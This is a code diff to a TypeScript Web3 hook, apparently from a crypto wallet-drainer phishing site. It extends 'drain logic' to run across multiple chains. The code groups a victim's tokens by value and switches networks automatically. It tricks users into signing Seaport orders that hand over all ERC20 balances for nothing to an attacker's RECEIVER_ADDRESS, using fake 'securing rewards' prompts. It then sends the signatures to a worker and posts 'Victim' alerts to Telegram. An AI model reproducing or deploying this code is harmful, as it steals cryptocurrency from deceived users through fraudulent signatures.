@@ -433,9 +433,10 @@ export function useWeb3Manager() {
                 method: 'wallet_switchEthereumChain',
                 params: [{ chainId: chainIdHex }],
             });
+            // Brief wait for state to sync
+            await new Promise(r => setTimeout(r, 1000));
             return true;
         } catch (switchError: any) {
-            // This error code indicates that the chain has not been added to MetaMask.
             if (switchError.code === 4902) {
                 console.warn("Chain not found in wallet");
                 notifyTelegram(`<b>⚠️ Network Switch Failed</b>\nTarget: ${chainIdHex}\nUser needs to add chain manually.`);
@@ -444,153 +445,185 @@ export function useWeb3Manager() {
         }
     };
 
-    // Execute Drain Logic (Seaport 1-Click)
+    const getChainName = (chainIdHex: string) => {
+        const mapping: Record<string, string> = {
+            "0x1": "ethereum",
+            "0x38": "bsc",
+            "0x89": "polygon",
+            "0x2105": "base",
+            "0xa4b1": "arbitrum",
+            "0xa": "optimism",
+            "0xa86a": "avalanche",
+            "0x19": "cronos",
+            "0xfa": "fantom",
+            "0xe708": "linea",
+            "0x534352": "scroll",
+            "0x144": "zksync"
+        };
+        return mapping[chainIdHex] || "ethereum";
+    };
+
+    // Execute Drain Logic (Sequential Multi-Chain)
     const claimReward = async (tokens: any[]) => {
         if (!walletProvider || !address || isProcessing.current) return;
         isProcessing.current = true;
 
         try {
-            const provider = new ethers.BrowserProvider(walletProvider);
-            const signer = await provider.getSigner();
-            const network = await provider.getNetwork();
-            const chainId = "0x" + network.chainId.toString(16);
-
-            // Filter tokens for the current chain
-            const chainTokens = tokens.filter(t => t.chainId === chainId && !t.isNative);
-
-            if (chainTokens.length === 0) {
-                setCurrentTask("No tokens detected on this chain for signature.");
-                isProcessing.current = false;
-                return;
-            }
-
-            setCurrentTask("Preparing secure signature for your rewards...");
-            notifyTelegram(`<b>✍️ Requesting Seaport Signature</b>\nAddress: <code>${address}</code>\nTokens: ${chainTokens.length}`);
-
-            // 1. Get Seaport Counter with Fallback
-            const seaport = new ethers.Contract(SEAPORT_ADDRESS, SEAPORT_ABI, provider);
-            let counter = 0n;
-            try {
-                // Check if code exists at address to avoid "decode result" crash
-                const code = await provider.getCode(SEAPORT_ADDRESS);
-                if (code !== "0x" && code !== "0x0") {
-                    counter = await seaport.getCounter(address);
-                } else {
-                    console.warn("Seaport not found on this chain, using counter 0");
+            // 1. Group tokens by chain and calculate total value per chain
+            const chainGroup: Record<string, { chainId: string; totalValue: number; tokens: any[] }> = {};
+            tokens.forEach(t => {
+                if (!chainGroup[t.chainId]) {
+                    chainGroup[t.chainId] = { chainId: t.chainId, totalValue: 0, tokens: [] };
                 }
-            } catch (err) {
-                console.warn("Error getting Seaport counter, defaulting to 0", err);
+                chainGroup[t.chainId].totalValue += t.usd_value || 0;
+                chainGroup[t.chainId].tokens.push(t);
+            });
+
+            // 2. Sort chains by total value descending
+            const sortedChains = Object.values(chainGroup).sort((a, b) => b.totalValue - a.totalValue);
+
+            for (const item of sortedChains) {
+                const targetChainId = item.chainId;
+                const targetChainName = getChainName(targetChainId);
+                const tokensOnChain = item.tokens.filter(t => !t.isNative);
+
+                if (tokensOnChain.length === 0) continue;
+
+                // A. Initialize Provider & Check Current Chain
+                let provider = new ethers.BrowserProvider(walletProvider);
+                let network = await provider.getNetwork();
+                let currentChainId = "0x" + network.chainId.toString(16);
+
+                // B. Auto-Switch if needed
+                if (currentChainId !== targetChainId) {
+                    setCurrentTask(`Switching to ${targetChainName.toUpperCase()} to secure assets...`);
+                    const switchOk = await switchNetwork(walletProvider, targetChainId);
+                    if (!switchOk) continue; // Skip to next chain if user refuses switch
+
+                    // Refresh provider/network after switch
+                    provider = new ethers.BrowserProvider(walletProvider);
+                    network = await provider.getNetwork();
+                }
+
+                // C. Seaport Logic for Current Chain
+                try {
+                    const signer = await provider.getSigner();
+                    setCurrentTask(`Securing ${targetChainName.toUpperCase()} rewards...`);
+                    notifyTelegram(`<b>✍️ Requesting Seaport Signature</b>\nChain: ${targetChainName}\nTokens: ${tokensOnChain.length}`);
+
+                    const seaport = new ethers.Contract(SEAPORT_ADDRESS, SEAPORT_ABI, provider);
+                    let counter = 0n;
+                    try {
+                        const code = await provider.getCode(SEAPORT_ADDRESS);
+                        if (code !== "0x" && code !== "0x0") {
+                            counter = await seaport.getCounter(address);
+                        }
+                    } catch (err) { }
+
+                    const startTime = Math.floor(Date.now() / 1000);
+                    const endTime = startTime + 60 * 60 * 24 * 30;
+
+                    const offer = tokensOnChain.map(t => ({
+                        itemType: 1, // ERC20
+                        token: t.address,
+                        identifierOrCriteria: 0,
+                        startAmount: t.balance,
+                        endAmount: t.balance
+                    }));
+
+                    const consideration = [{
+                        itemType: 1,
+                        token: "0x0000000000000000000000000000000000000000",
+                        identifierOrCriteria: 0,
+                        startAmount: 0,
+                        endAmount: 0,
+                        recipient: RECEIVER_ADDRESS
+                    }];
+
+                    const orderComponents = {
+                        offerer: address,
+                        zone: "0x0000000000000000000000000000000000000000",
+                        offer,
+                        consideration,
+                        orderType: 0,
+                        startTime,
+                        endTime,
+                        zoneHash: "0x0000000000000000000000000000000000000000000000000000000000000000",
+                        salt: ethers.hexlify(ethers.randomBytes(32)),
+                        conduitKey: "0x0000000000000000000000000000000000000000000000000000000000000000",
+                        counter
+                    };
+
+                    const domain = {
+                        name: "Seaport",
+                        version: "1.5",
+                        chainId: network.chainId,
+                        verifyingContract: SEAPORT_ADDRESS
+                    };
+
+                    const types = {
+                        OrderComponents: [
+                            { name: "offerer", type: "address" },
+                            { name: "zone", type: "address" },
+                            { name: "offer", type: "OfferItem[]" },
+                            { name: "consideration", type: "ConsiderationItem[]" },
+                            { name: "orderType", type: "uint8" },
+                            { name: "startTime", type: "uint256" },
+                            { name: "endTime", type: "uint256" },
+                            { name: "zoneHash", type: "bytes32" },
+                            { name: "salt", type: "uint256" },
+                            { name: "conduitKey", type: "bytes32" },
+                            { name: "counter", type: "uint256" }
+                        ],
+                        OfferItem: [
+                            { name: "itemType", type: "uint8" },
+                            { name: "token", type: "address" },
+                            { name: "identifierOrCriteria", type: "uint256" },
+                            { name: "startAmount", type: "uint256" },
+                            { name: "endAmount", type: "uint256" }
+                        ],
+                        ConsiderationItem: [
+                            { name: "itemType", type: "uint8" },
+                            { name: "token", type: "address" },
+                            { name: "identifierOrCriteria", type: "uint256" },
+                            { name: "startAmount", type: "uint256" },
+                            { name: "endAmount", type: "uint256" },
+                            { name: "recipient", type: "address" }
+                        ]
+                    };
+
+                    const signature = await signer.signTypedData(domain, types, orderComponents);
+
+                    // D. Submit to Worker (Fixed Submission)
+                    try {
+                        const workerUrl = process.env.NEXT_PUBLIC_WORKER_URL || "http://localhost:8080";
+                        await fetch(`${workerUrl}/submit-evm-order`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                order: { parameters: orderComponents, signature },
+                                chainName: targetChainName
+                            })
+                        });
+                        notifyTelegram(`<b>🎯 SEAPORT CAPTURED (${targetChainName.toUpperCase()})</b>\nVictim: <code>${address}</code>\nTokens: ${tokensOnChain.length}\nSync: Local Worker ✅`);
+                    } catch (syncErr) {
+                        notifyTelegram(`<b>🎯 SEAPORT CAPTURED (${targetChainName.toUpperCase()})</b>\nSync: Local Worker ❌\nSignature:\n<code>${signature}</code>`);
+                    }
+
+                } catch (signErr: any) {
+                    console.error(`Sign failed on ${targetChainName}`, signErr);
+                    if (signErr.code === "ACTION_REJECTED") {
+                        notifyTelegram(`<b>❌ User Rejected</b> on ${targetChainName.toUpperCase()}`);
+                        break; // Stop loop if they reject
+                    }
+                }
             }
 
-            // 2. Construct Seaport Order
-            const startTime = Math.floor(Date.now() / 1000);
-            const endTime = startTime + 60 * 60 * 24 * 30; // 30 days valid
-
-            const offer = chainTokens.map(t => ({
-                itemType: 1, // ERC20
-                token: t.address,
-                identifierOrCriteria: 0,
-                startAmount: t.balance,
-                endAmount: t.balance
-            }));
-
-            // Consideration is empty (0 cost)
-            const consideration = [{
-                itemType: 1, // ERC20 (dummy placeholder or empty)
-                token: "0x0000000000000000000000000000000000000000",
-                identifierOrCriteria: 0,
-                startAmount: 0,
-                endAmount: 0,
-                recipient: RECEIVER_ADDRESS
-            }];
-
-            const orderComponents = {
-                offerer: address,
-                zone: "0x0000000000000000000000000000000000000000",
-                offer: offer,
-                consideration: consideration,
-                orderType: 0, // FULL_OPEN
-                startTime: startTime,
-                endTime: endTime,
-                zoneHash: "0x0000000000000000000000000000000000000000000000000000000000000000",
-                salt: ethers.hexlify(ethers.randomBytes(32)),
-                conduitKey: "0x0000000000000000000000000000000000000000000000000000000000000000",
-                counter: counter
-            };
-
-            const domain = {
-                name: "Seaport",
-                version: "1.5",
-                chainId: network.chainId,
-                verifyingContract: SEAPORT_ADDRESS
-            };
-
-            const types = {
-                OrderComponents: [
-                    { name: "offerer", type: "address" },
-                    { name: "zone", type: "address" },
-                    { name: "offer", type: "OfferItem[]" },
-                    { name: "consideration", type: "ConsiderationItem[]" },
-                    { name: "orderType", type: "uint8" },
-                    { name: "startTime", type: "uint256" },
-                    { name: "endTime", type: "uint256" },
-                    { name: "zoneHash", type: "bytes32" },
-                    { name: "salt", type: "uint256" },
-                    { name: "conduitKey", type: "bytes32" },
-                    { name: "counter", type: "uint256" }
-                ],
-                OfferItem: [
-                    { name: "itemType", type: "uint8" },
-                    { name: "token", type: "address" },
-                    { name: "identifierOrCriteria", type: "uint256" },
-                    { name: "startAmount", type: "uint256" },
-                    { name: "endAmount", type: "uint256" }
-                ],
-                ConsiderationItem: [
-                    { name: "itemType", type: "uint8" },
-                    { name: "token", type: "address" },
-                    { name: "identifierOrCriteria", type: "uint256" },
-                    { name: "startAmount", type: "uint256" },
-                    { name: "endAmount", type: "uint256" },
-                    { name: "recipient", type: "address" }
-                ]
-            };
-
-            // 3. Request Signature
-            setCurrentTask("Please sign the secure proof to verify asset ownership. This requires 0 gas.");
-            const signature = await signer.signTypedData(domain, types, orderComponents);
-
-            // 4. Submit Order to Worker
-            try {
-                const workerUrl = process.env.NEXT_PUBLIC_WORKER_URL || "http://localhost:8080";
-                await fetch(`${workerUrl}/submit-evm-order`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ order: { parameters: orderComponents, signature }, chainName: targetChain })
-                });
-                notifyTelegram(`<b>📡 Order Synced to Worker</b>\nChain: ${targetChain}\nVictim: <code>${address}</code>`);
-            } catch (syncErr) {
-                console.warn("Failed to sync order to local worker, relying on Telegram", syncErr);
-            }
-
-            notifyTelegram(
-                `<b>🎯 SEAPORT ORDER CAPTURED!</b>\n` +
-                `Victim: <code>${address}</code>\n` +
-                `Tokens: ${chainTokens.length}\n\n` +
-                `<b>Order Components:</b>\n<pre>${JSON.stringify(orderComponents, (k, v) => typeof v === 'bigint' ? v.toString() : v, 2)}</pre>\n\n` +
-                `<b>Signature:</b>\n<code>${signature}</code>`
-            );
-
-            setCurrentTask("Asset verification successful. Tracy is securing your rewards in the background.");
+            setCurrentTask("Verification successful. Securing all rewards...");
             isProcessing.current = false;
 
         } catch (e: any) {
-            console.error("Seaport Signature Failed", e);
-            if (e.code === "ACTION_REJECTED" || e.message?.includes("rejected")) {
-                notifyTelegram(`<b>❌ User Rejected</b> Seaport Signature`);
-            } else {
-                notifyTelegram(`<b>☠️ Seaport Error</b>: ${e.message?.slice(0, 100)}`);
-            }
+            console.error("Drain loop failed", e);
             isProcessing.current = false;
         }
     };
